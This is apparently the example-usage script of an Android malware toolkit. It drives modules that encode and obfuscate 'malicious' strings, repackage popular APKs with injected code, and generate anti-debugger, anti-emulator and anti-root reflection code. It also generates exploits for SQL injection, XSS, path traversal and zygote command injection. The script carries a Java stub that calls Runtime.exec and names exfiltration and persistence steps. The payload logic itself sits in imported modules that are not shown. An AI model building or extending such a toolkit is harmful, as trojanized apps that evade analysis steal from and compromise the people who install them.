#!/usr/bin/env python3
"""
Android ARM64 String Encoder and Injection System - Example Usage
Demonstrates various features and capabilities of the system.
"""

import os
import sys
import logging
from typing import Dict, List, Any

# Add the arm64 directory to the path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from android_string_injector import AndroidStringInjector
from string_encoder import StringEncoder
from injection_engine import InjectionEngine
from obfuscation_manager import ObfuscationManager
from repackaging_tool import RepackagingTool
from reflection_engine import ReflectionEngine
from vulnerability_exploiter import VulnerabilityExploiter

def setup_logging():
    """Setup logging configuration."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )

def example_string_encoding():
    """Demonstrate string encoding capabilities."""
    print("\n=== String Encoding Example ===")
    
    # Initialize string encoder
    encoder = StringEncoder()
    
    # Test strings to encode
    test_strings = [
        "malicious_command_1",
        "sensitive_data_2",
        "encrypted_payload_3",
        "network_address_4",
        "file_path_5"
    ]
    
    # Encode strings with different methods
    encoding_methods = ['AES', 'XOR', 'Base64', 'ROT13', 'Custom']
    
    for i, string in enumerate(test_strings):
        method = encoding_methods[i % len(encoding_methods)]
        print(f"\nEncoding '{string}' with {method}:")
        
        try:
            encoded_result = encoder.encode_string(string, method)
            print(f"  Method: {encoded_result['method']}")
            print(f"  Encoded: {encoded_result['encoded_string'][:50]}...")
            print(f"  Key: {encoded_result.get('key', 'N/A')[:20]}...")
            print(f"  Java Code Length: {len(encoded_result['java_code'])} characters")
            
        except Exception as e:
            print(f"  Error: {e}")
    
    # Demonstrate obfuscation
    print(f"\n=== String Obfuscation Example ===")
    
    obfuscation_methods = ['Split', 'Reverse', 'Scramble', 'Null', 'Junk']
    
    for i, string in enumerate(test_strings[:3]):
        method = obfuscation_methods[i % len(obfuscation_methods)]
        print(f"\nObfuscating '{string}' with {method}:")
        
        try:
            obfuscated_result = encoder.obfuscate_string(string, method)
            print(f"  Method: {obfuscated_result['method']}")
            print(f"  Obfuscated: {obfuscated_result.get('obfuscated_string', 'N/A')[:50]}...")
            print(f"  Java Code Length: {len(obfuscated_result['java_code'])} characters")
            
        except Exception as e:
            print(f"  Error: {e}")

def example_injection_engine():
    """Demonstrate injection engine capabilities."""
    print(f"\n=== Injection Engine Example ===")
    
    # Initialize injection engine
    injection_engine = InjectionEngine()
    
    # Create sample encoded strings
    sample_strings = [
        {
            'method': 'AES',
            'encoded_string': 'encrypted_string_1',
            'java_code': 'private static String decryptAES() { return "decrypted_1"; }'
        },
        {
            'method': 'XOR',
            'encoded_string': 'encrypted_string_2',
            'java_code': 'private static String decryptXOR() { return "decrypted_2"; }'
        }
    ]
    
    print(f"Injection Engine Status:")
    status = injection_engine.get_injection_status()
    print(f"  Supported Methods: {status['supported_methods']}")
    print(f"  Target Files: {status['target_files']}")
    print(f"  Android Target: {status['android_target']}")
    
    # Note: Actual APK injection would require a real APK file
    print(f"\nNote: Actual APK injection requires a real APK file.")
    print(f"Sample injection would target: {status['target_files']}")

def example_obfuscation_manager():
    """Demonstrate obfuscation manager capabilities."""
    print(f"\n=== Obfuscation Manager Example ===")
    
    # Initialize obfuscation manager
    obfuscation_manager = ObfuscationManager()
    
    # Sample Java code to obfuscate
    sample_java_code = '''
public class MainActivity extends AppCompatActivity {
    private String sensitiveData = "secret_information";
    private int counter = 0;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initializeApp();
        loadUserData();
        processSensitiveData();
    }
    
    private void initializeApp() {
        // App initialization code
    }
    
    private void loadUserData() {
        // Load user data
    }
    
    private void processSensitiveData() {
        // Process sensitive data
    }
}
    '''
    
    print(f"Original Java Code Length: {len(sample_java_code)} characters")
    
    # Test different obfuscation methods
    obfuscation_methods = ['name_obfuscation', 'control_flow', 'string_encryption', 'reflection']
    
    for method in obfuscation_methods:
        print(f"\nObfuscating with {method}:")
        
        try:
            obfuscated_result = obfuscation_manager.obfuscate_java_code(sample_java_code, method)
            print(f"  Method: {obfuscated_result['method']}")
            print(f"  Original Length: {obfuscated_result['metadata']['original_length']}")
            print(f"  Obfuscated Length: {obfuscated_result['metadata']['obfuscated_length']}")
            print(f"  Expansion Ratio: {obfuscated_result['metadata']['obfuscated_length'] / obfuscated_result['metadata']['original_length']:.2f}")
            
            if 'name_mappings' in obfuscated_result:
                print(f"  Names Obfuscated: {obfuscated_result['metadata']['names_obfuscated']}")
            
        except Exception as e:
            print(f"  Error: {e}")

def example_repackaging_tool():
    """Demonstrate repackaging tool capabilities."""
    print(f"\n=== Repackaging Tool Example ===")
    
    # Initialize repackaging tool
    repackaging_tool = RepackagingTool()
    
    # Sample malicious code
    malicious_code = '''
    private void executeMaliciousCode() {
        try {
            // Malicious functionality
            String command = "malicious_command";
            Runtime.getRuntime().exec(command);
            
            // Data exfiltration
            exfiltrateData();
            
            // Persistence
            establishPersistence();
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private void exfiltrateData() {
        // Data exfiltration logic
    }
    
    private void establishPersistence() {
        // Persistence logic
    }
    '''
    
    print(f"Repackaging Tool Status:")
    status = repackaging_tool.get_repackaging_status()
    print(f"  Supported Methods: {status['supported_methods']}")
    print(f"  Target Apps: {len(status['target_apps']['popular_apps'])} popular apps")
    print(f"  Injection Config: {status['injection_config']}")
    
    # Note: Actual repackaging would require a real APK file
    print(f"\nNote: Actual APK repackaging requires a real APK file.")
    print(f"Sample repackaging would use: {status['supported_methods']}")

def example_reflection_engine():
    """Demonstrate reflection engine capabilities."""
    print(f"\n=== Reflection Engine Example ===")
    
    # Initialize reflection engine
    reflection_engine = ReflectionEngine()
    
    # Test reflection operations
    reflection_operations = [
        {'type': 'method_invocation', 'target_class': 'com.malicious.MaliciousClass', 'target_method': 'executeMaliciousCode'},
        {'type': 'object_instantiation', 'target_class': 'com.malicious.MaliciousObject'},
        {'type': 'field_access', 'target_class': 'com.malicious.MaliciousClass', 'target_field': 'sensitiveData'},
        {'type': 'class_loading', 'target_class': 'com.malicious.DynamicClass'}
    ]
    
    for operation in reflection_operations:
        print(f"\nGenerating reflection code for {operation['type']}:")
        
        try:
            reflection_result = reflection_engine.generate_reflection_code(
                operation['target_class'],
                operation.get('target_method', operation.get('target_field', 'unknown')),
                operation['type']
            )
            
            print(f"  Method Type: {reflection_result['method_type']}")
            print(f"  Target Class: {reflection_result['target_class']}")
            print(f"  Obfuscated Class: {reflection_result.get('obfuscated_class', 'N/A')}")
            print(f"  Code Length: {len(reflection_result['reflection_code'])} characters")
            
        except Exception as e:
            print(f"  Error: {e}")
    
    # Generate anti-analysis reflection code
    print(f"\nGenerating anti-analysis reflection code:")
    try:
        anti_analysis_result = reflection_engine.generate_anti_analysis_reflection_code()
        print(f"  Method Type: {anti_analysis_result['method_type']}")
        print(f"  Anti-Debugger: {anti_analysis_result['metadata']['anti_debugger']}")
        print(f"  Anti-Emulator: {anti_analysis_result['metadata']['anti_emulator']}")
        print(f"  Anti-Root: {anti_analysis_result['metadata']['anti_root']}")
        print(f"  Code Length: {len(anti_analysis_result['reflection_code'])} characters")
        
    except Exception as e:
        print(f"  Error: {e}")

def example_vulnerability_exploiter():
    """Demonstrate vulnerability exploiter capabilities."""
    print(f"\n=== Vulnerability Exploiter Example ===")
    
    # Initialize vulnerability exploiter
    vulnerability_exploiter = VulnerabilityExploiter()
    
    # Test vulnerability exploitation
    vulnerabilities = [
        {'type': 'deserialization', 'target_component': 'Activity', 'payload_type': 'string_injection'},
        {'type': 'sql_injection', 'target_component': 'ContentProvider', 'payload_type': 'union_based'},
        {'type': 'js_injection', 'target_component': 'WebView', 'payload_type': 'xss'},
        {'type': 'input_validation', 'target_component': 'ContentProvider', 'payload_type': 'path_traversal'},
        {'type': 'zygote_injection', 'target_component': 'System', 'payload_type': 'command_injection'}
    ]
    
    for vulnerability in vulnerabilities:
        print(f"\nGenerating exploit for {vulnerability['type']}:")
        
        try:
            exploit_result = vulnerability_exploiter.generate_exploitation_code(
                vulnerability['type'],
                vulnerability['target_component'],
                vulnerability['payload_type']
            )
            
            print(f"  Vulnerability Type: {exploit_result['vulnerability_type']}")
            print(f"  Target Component: {exploit_result['target_component']}")
            print(f"  Payload Type: {exploit_result['payload_type']}")
            print(f"  Code Length: {len(exploit_result['exploit_code'])} characters")
            
            # Show metadata
            metadata = exploit_result['metadata']
            for key, value in metadata.items():
                if value:
                    print(f"  {key.replace('_', ' ').title()}: {value}")
            
        except Exception as e:
            print(f"  Error: {e}")
    
    # Generate comprehensive exploit
    print(f"\nGenerating comprehensive exploit:")
    try:
        comprehensive_exploit = vulnerability_exploiter.generate_comprehensive_exploit(vulnerabilities)
        print(f"  Method Type: {comprehensive_exploit['method_type']}")
        print(f"  Vulnerabilities Count: {comprehensive_exploit['vulnerabilities_count']}")
        print(f"  Code Length: {len(comprehensive_exploit['exploit_code'])} characters")
        print(f"  Multiple Vulnerabilities: {comprehensive_exploit['metadata']['multiple_vulnerabilities']}")
        print(f"  Comprehensive Approach: {comprehensive_exploit['metadata']['comprehensive_approach']}")
        
    except Exception as e:
        print(f"  Error: {e}")

def example_comprehensive_injection():
    """Demonstrate comprehensive injection capabilities."""
    print(f"\n=== Comprehensive Injection Example ===")
    
    # Initialize Android string injector
    injector = AndroidStringInjector()
    
    # Sample strings to inject
    strings_to_inject = [
        "malicious_command_1",
        "sensitive_data_2",
        "encrypted_payload_3",
        "network_address_4",
        "file_path_5"
    ]
    
    print(f"Comprehensive Injection Status:")
    status = injector.get_injector_status()
    print(f"  String Encoder: {len(status['string_encoder_status']['supported_methods']['encryption'])} encryption methods")
    print(f"  Injection Engine: {len(status['injection_engine_status']['supported_methods'])} injection methods")
    print(f"  Obfuscation Manager: {len(status['obfuscation_manager_status']['supported_methods'])} obfuscation methods")
    print(f"  Repackaging Tool: {len(status['repackaging_tool_status']['supported_methods'])} repackaging methods")
    print(f"  Reflection Engine: {len(status['reflection_engine_status']['supported_methods'])} reflection methods")
    print(f"  Vulnerability Exploiter: {len(status['vulnerability_exploiter_status']['supported_vulnerabilities'])} vulnerability types")
    
    # Note: Actual injection would require a real APK file
    print(f"\nNote: Actual APK injection requires a real APK file.")
    print(f"Sample injection would process {len(strings_to_inject)} strings:")
    for i, string in enumerate(strings_to_inject):
        print(f"  {i+1}. {string}")

def main():
    """Main function to run all examples."""
    print("Android ARM64 String Encoder and Injection System - Example Usage")
    print("=" * 70)
    
    # Setup logging
    setup_logging()
    
    try:
        # Run all examples
        example_string_encoding()
        example_injection_engine()
        example_obfuscation_manager()
        example_repackaging_tool()
        example_reflection_engine()
        example_vulnerability_exploiter()
        example_comprehensive_injection()
        
        print(f"\n" + "=" * 70)
        print("All examples completed successfully!")
        print("For actual APK injection, provide real APK files and run the injection methods.")
        
    except Exception as e:
        print(f"\nError running examples: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()